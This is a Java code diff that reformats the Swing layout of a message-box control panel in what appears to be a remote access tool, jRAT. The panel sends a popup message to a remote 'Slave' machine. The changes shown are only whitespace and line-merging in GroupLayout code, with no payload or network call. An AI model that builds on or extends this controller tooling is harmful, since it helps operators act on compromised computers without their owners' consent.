@@ -23,7 +23,6 @@ import javax.swing.ScrollPaneConstants;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet10Messagebox;
 
-
 @SuppressWarnings("serial")
 public class PanelControlMessagebox extends PanelControlParent {
 
@@ -93,53 +92,12 @@ public class PanelControlMessagebox extends PanelControlParent {
 				JOptionPane.showMessageDialog(null, txtMsg.getText(), txtTitle.getText(), getIcon());
 			}
 		});
-		
+
 		chckbxSetSystemFeel = new JCheckBox("Set system feel");
 		chckbxSetSystemFeel.setToolTipText("Sets the default system look and feel and not the default java");
 		GroupLayout gl_panel_1 = new GroupLayout(panel_1);
-		gl_panel_1.setHorizontalGroup(
-			gl_panel_1.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_panel_1.createSequentialGroup()
-					.addGroup(gl_panel_1.createParallelGroup(Alignment.TRAILING)
-						.addGroup(gl_panel_1.createSequentialGroup()
-							.addContainerGap()
-							.addComponent(lblTitle)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(txtTitle, GroupLayout.DEFAULT_SIZE, 278, Short.MAX_VALUE))
-						.addGroup(gl_panel_1.createSequentialGroup()
-							.addGap(11)
-							.addComponent(lblMsg)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 277, GroupLayout.PREFERRED_SIZE))
-						.addGroup(gl_panel_1.createSequentialGroup()
-							.addContainerGap()
-							.addComponent(chckbxSetSystemFeel)
-							.addGap(18)
-							.addComponent(btnTest)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(btnSend)))
-					.addContainerGap())
-		);
-		gl_panel_1.setVerticalGroup(
-			gl_panel_1.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_panel_1.createSequentialGroup()
-					.addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE)
-						.addComponent(lblTitle)
-						.addComponent(txtTitle, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
-					.addGroup(gl_panel_1.createParallelGroup(Alignment.LEADING)
-						.addGroup(gl_panel_1.createSequentialGroup()
-							.addGap(8)
-							.addComponent(lblMsg))
-						.addGroup(gl_panel_1.createSequentialGroup()
-							.addGap(11)
-							.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 103, GroupLayout.PREFERRED_SIZE)))
-					.addPreferredGap(ComponentPlacement.RELATED, 10, Short.MAX_VALUE)
-					.addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE)
-						.addComponent(btnSend)
-						.addComponent(btnTest)
-						.addComponent(chckbxSetSystemFeel))
-					.addContainerGap())
-		);
+		gl_panel_1.setHorizontalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addGroup(gl_panel_1.createSequentialGroup().addGroup(gl_panel_1.createParallelGroup(Alignment.TRAILING).addGroup(gl_panel_1.createSequentialGroup().addContainerGap().addComponent(lblTitle).addPreferredGap(ComponentPlacement.RELATED).addComponent(txtTitle, GroupLayout.DEFAULT_SIZE, 278, Short.MAX_VALUE)).addGroup(gl_panel_1.createSequentialGroup().addGap(11).addComponent(lblMsg).addPreferredGap(ComponentPlacement.RELATED).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 277, GroupLayout.PREFERRED_SIZE)).addGroup(gl_panel_1.createSequentialGroup().addContainerGap().addComponent(chckbxSetSystemFeel).addGap(18).addComponent(btnTest).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSend))).addContainerGap()));
+		gl_panel_1.setVerticalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addGroup(gl_panel_1.createSequentialGroup().addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE).addComponent(lblTitle).addComponent(txtTitle, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addGroup(gl_panel_1.createSequentialGroup().addGap(8).addComponent(lblMsg)).addGroup(gl_panel_1.createSequentialGroup().addGap(11).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 103, GroupLayout.PREFERRED_SIZE))).addPreferredGap(ComponentPlacement.RELATED, 10, Short.MAX_VALUE).addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE).addComponent(btnSend).addComponent(btnTest).addComponent(chckbxSetSystemFeel)).addContainerGap()));
 
 		txtMsg = new JTextPane();
 		txtMsg.setText("Message.");
